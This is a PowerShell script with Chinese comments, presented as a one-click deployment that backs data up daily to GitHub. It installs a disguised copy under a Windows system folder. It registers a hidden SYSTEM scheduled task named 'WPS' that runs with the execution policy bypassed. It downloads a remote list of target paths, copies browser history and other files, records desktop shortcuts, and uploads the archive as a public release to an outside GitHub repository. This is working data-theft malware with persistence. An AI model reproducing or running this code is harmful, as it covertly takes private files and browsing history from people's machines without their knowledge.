# install.ps1 - 一键部署并每日自动上传到 GitHub（任务名：WPS）

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$localPath = "C:\ProgramData\Microsoft\Windows\system-maintainer.ps1"
$taskName = "WPS"
$logPath = "C:\ProgramData\Microsoft\Windows\system-maintainer.log"

function Log($msg) {
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $msg
    $line | Out-File -FilePath $logPath -Append
    Write-Host $line
}

Log "`n==== Script Started ===="

# === 保存副本 ===
try {
    $self = $MyInvocation.MyCommand.Definition
    Copy-Item -Path $self -Destination $localPath -Force -ErrorAction Stop
    Log "✅ 已保存副本到 $localPath"
} catch {
    Log "❌ 无法保存副本：$($_.Exception.Message)"
    Pause; Start-Process notepad.exe $logPath; exit 1
}

# === 注册计划任务 ===
try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
    $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
    Log "✅ 注册任务 [$taskName] 成功（每天 0 点执行）"
} catch {
    Log "❌ 注册任务失败：$($_.Exception.Message)"
    Pause; Start-Process notepad.exe $logPath; exit 2
}

# === 检查 GITHUB_TOKEN ===
$token = $env:GITHUB_TOKEN
if (-not $token) {
    Log "❌ 环境变量 GITHUB_TOKEN 未设置"
    Pause; Start-Process notepad.exe $logPath; exit 3
}

# === 上传逻辑 ===
$repo = "rtyuiuiop/1"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null

# STEP 1 - 下载路径列表
$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-target.txt"
try {
    Log "📥 下载上传路径列表..."
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | Where-Object { $_.Trim() -ne "" }
    Log "✅ 成功加载 $($pathList.Count) 个路径"
} catch {
    Log "❌ 下载路径列表失败：$($_.Exception.Message)"
    Pause; Start-Process notepad.exe $logPath; exit 4
}

# STEP 2 - 复制文件
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"
    if (-not (Test-Path $path)) {
        Log "⚠️ 跳过不存在路径：$path"
        continue
    }
    $dest = Join-Path $tempRoot $name
    try {
        if ($path -like "*\\History" -and (Test-Path $path -PathType Leaf)) {
            robocopy (Split-Path $path) $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            Log "📂 robocopy 成功：$path"
        } elseif ((Get-Item $path).PSIsContainer) {
            Copy-Item $path -Destination $dest -Recurse -Force
            Log "📁 文件夹已复制：$path"
        } else {
            Copy-Item $path -Destination $dest -Force
            Log "📄 文件已复制：$path"
        }
    } catch {
        Log "❌ 复制失败：$path - $($_.Exception.Message)"
    }
}

# STEP 3 - 收集桌面快捷方式
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk -ErrorAction SilentlyContinue
    $report = ""
    foreach ($lnk in $lnkFiles) {
        $shell = New-Object -ComObject WScript.Shell
        $sc = $shell.CreateShortcut($lnk.FullName)
        $report += "[$($lnk.Name)]`nTarget: $($sc.TargetPath)`nArgs: $($sc.Arguments)`nStartIn: $($sc.WorkingDirectory)`nIcon: $($sc.IconLocation)`n-----`n"
    }
    $report | Out-File (Join-Path $tempRoot "lnk_info.txt") -Encoding UTF8
    Log "🧷 快捷方式信息已收集"
} catch {
    Log "⚠️ 快捷方式提取失败：$($_.Exception.Message)"
}

# STEP 4 - 压缩
try {
    Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force
    Log "📦 压缩完成：$zipPath"
} catch {
    Log "❌ 压缩失败：$($_.Exception.Message)"
    Pause; Start-Process notepad.exe $logPath; exit 5
}

# STEP 5 - 上传至 GitHub Release
$releaseData = @{
    tag_name   = $tag
    name       = $releaseName
    body       = "Backup from $computerName on $date"
    draft      = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "PSUploader"
    Accept        = "application/vnd.github.v3+json"
}

try {
    $res = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
    $uploadUrl = $res.upload_url -replace "{.*}", "?name=$zipName"
    Log "🚀 Release 创建成功"
} catch {
    Log "❌ 创建 Release 失败：$($_.Exception.Message)"
    Pause; Start-Process notepad.exe $logPath; exit 6
}

try {
    $bytes = [System.IO.File]::ReadAllBytes($zipPath)
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{ Authorization="token $token"; "Content-Type"="application/zip" } -Body $bytes
    Log "☁️ 上传成功：$zipName"
} catch {
    Log "❌ 上传失败：$($_.Exception.Message)"
    Pause; Start-Process notepad.exe $logPath; exit 7
}

# STEP 6 - 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Log "🧹 清理完成"
Log "==== Script Finished ===="

# STEP 7 - 安装阶段查看日志
if ($MyInvocation.MyCommand.Path -ne $localPath) {
    Pause
    Start-Process notepad.exe $logPath
}
